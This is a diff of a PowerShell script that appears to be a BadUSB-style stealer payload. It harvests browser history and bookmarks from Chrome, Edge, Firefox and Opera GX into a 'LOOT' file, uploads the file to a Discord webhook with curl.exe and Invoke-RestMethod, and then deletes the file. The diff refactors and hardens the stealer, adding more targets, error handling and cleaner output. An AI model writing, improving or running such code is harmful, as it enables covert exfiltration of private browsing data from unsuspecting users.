@@ -1,81 +1,110 @@
-$FileName = "$env:tmp/$env:USERNAME-LOOT-browsers-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+# File to store the browser data
+$FileName = "$env:TMP\$env:USERNAME-LOOT-browsers-$(Get-Date -Format 'yyyy-MM-dd_HH-mm').txt"
 
+# Function to extract browser data using regex
 function Get-BrowserData {
-
     [CmdletBinding()]
     param (	
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$Browser,    
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$DataType 
+        [Parameter (Position=1, Mandatory=$true)]
+        [string]$Browser,
+        [Parameter (Position=2, Mandatory=$true)]
+        [string]$DataType 
     ) 
 
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w\- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+    # Define browser-specific file paths
+    switch ("$Browser-$DataType") {
+        'chrome-history'   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+        'chrome-bookmarks' { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+        'edge-history'     { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
+        'edge-bookmarks'   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" }
+        'firefox-history'  { $Path = (Get-ChildItem "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\" -Directory | Where-Object { $_.Name -like '*.default-release' } | Select-Object -First 1).FullName + "\places.sqlite" }
+        'opera-history'    { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
+        'opera-bookmarks'  { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
+        default            { return }
+    }
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-    $Value | ForEach-Object {
-        $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Data = $_
+    # Check file exists
+    if (-not (Test-Path $Path)) {
+        Write-Verbose "Path not found: $Path"
+        return
+    }
+
+    # Extract matches from file using regex
+    try {
+        Get-Content -Path $Path -ErrorAction Stop | 
+            Select-String -AllMatches $Regex | 
+            ForEach-Object {
+                $_.Matches.Value | Sort -Unique | ForEach-Object {
+                    [PSCustomObject]@{
+                        User     = $env:USERNAME
+                        Browser  = $Browser
+                        DataType = $DataType
+                        Data     = $_
+                    }
+                }
             }
-        }
-    } 
+    } catch {
+        Write-Warning "Failed to read: $Path"
+    }
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\BrowserData.txt
+# Call the function for each browser and datatype and store results
+$AllData = @()
+$AllData += Get-BrowserData -Browser "edge" -DataType "history"
+$AllData += Get-BrowserData -Browser "edge" -DataType "bookmarks"
+$AllData += Get-BrowserData -Browser "chrome" -DataType "history"
+$AllData += Get-BrowserData -Browser "chrome" -DataType "bookmarks"
+$AllData += Get-BrowserData -Browser "firefox" -DataType "history"
+$AllData += Get-BrowserData -Browser "opera" -DataType "history"
+$AllData += Get-BrowserData -Browser "opera" -DataType "bookmarks"
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\BrowserData.txt
+# Format output and write to file
+if ($AllData.Count -gt 0) {
+    $AllData | ForEach-Object {
+        "$($_.User), $($_.Browser), $($_.DataType), $($_.Data)"
+    } | Out-File -FilePath $FileName -Encoding UTF8
+} else {
+    "No browser data found." | Out-File -FilePath $FileName -Encoding UTF8
+}
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\BrowserData.txt
-
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\BrowserData.txt
-
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\BrowserData.txt
-
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\BrowserData.txt
-#------------------------------------------------------------------------------------------------------------------------------------
-
-
-
+# -----------------------------------------
+# Function to upload file to Discord
 function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [Parameter(Position=0, Mandatory=$false)]
+        [string]$file,
+        [Parameter(Position=1, Mandatory=$false)]
+        [string]$text
+    )
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+    # Discord webhook URL - make sure $dc is defined!
+    $hookurl = "$dc"
 
-$hookurl = "$dc"
+    # Message body
+    $Body = @{
+        'username' = $env:USERNAME
+        'content'  = $text
+    }
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+    # Send message
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    # Upload file
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
 }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+# Upload file if webhook URL is set
+if (-not ([string]::IsNullOrEmpty($dc))) {
+    Upload-Discord -file $FileName -text "Browser data for $env:USERNAME"
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\BrowserData.txt}
-
-
-############################################################################################################################################################
-RI $env:TEMP\BrowserData.txt
+# -----------------------------------------
+# Cleanup
+Remove-Item -Path $FileName -Force -ErrorAction SilentlyContinue
